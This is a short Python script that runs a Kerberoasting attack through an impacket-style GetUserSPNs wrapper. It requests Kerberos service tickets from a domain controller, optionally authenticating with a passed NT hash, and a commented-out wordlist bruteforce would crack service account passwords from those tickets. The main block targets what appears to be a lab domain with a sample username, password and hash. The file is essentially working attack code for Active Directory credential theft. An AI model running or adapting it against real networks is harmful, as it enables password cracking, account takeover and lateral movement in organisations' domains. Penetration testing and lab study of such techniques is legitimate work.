from pympacket.attacks.GetUserSPNs import GetUserSPNs
from pympacket.utils.bruteforce import bruteforce
from argparse import Namespace
import logging
import sys
from pprint import pprint

def kerberoast(username, domain, dc_ip, password='', nthash=None):
    # This script is meant to be executed against the current domain, for now
    user_domain = domain
    target_domain = domain

    if nthash is not None:
        nthash = f'aad3c435b514a4eeaad3b935b51304fe:{nthash}'

    logging.disable(sys.maxsize) #Disable impacket logger
    cmdLineOptions = Namespace(
        no_preauth=None,
        outputfile=None,
        usersfile=None,
        aesKey=None,
        k=False,
        request=True,
        dc_ip=dc_ip,
        dc_host=None,
        save=False,
        request_user=None,
        stealth=False,
        hashes=nthash
    )

    krbroasting = GetUserSPNs(username, password, user_domain, target_domain, cmdLineOptions=cmdLineOptions)
    return krbroasting.run()


if __name__ == '__main__':
    #tgs_out = kerberoast(username='l.douglas', password='Football1', domain='contoso.local')
    tgs_out = kerberoast(username='l.douglas', nthash="e3162fc537e66f4dc1287271cdbec59b", dc_ip="192.168.56.133", domain='contoso.local')

    # Output is a list of dict in the following format, None if error:
    # [{'username':'svc_sql', 'spn':'MSSQL/DB01', 'tgs':'$krb5tgs$23$*svc_sql$...'}]
    pprint(tgs_out)

    #if tgs_out is not None:
    #    for tgs in tgs_out:
    #        result = bruteforce('fasttrack.txt', tgs['tgs'], 'tgs')
    #        if result is not None:
    #            print(f"{tgs['username']}:{result}")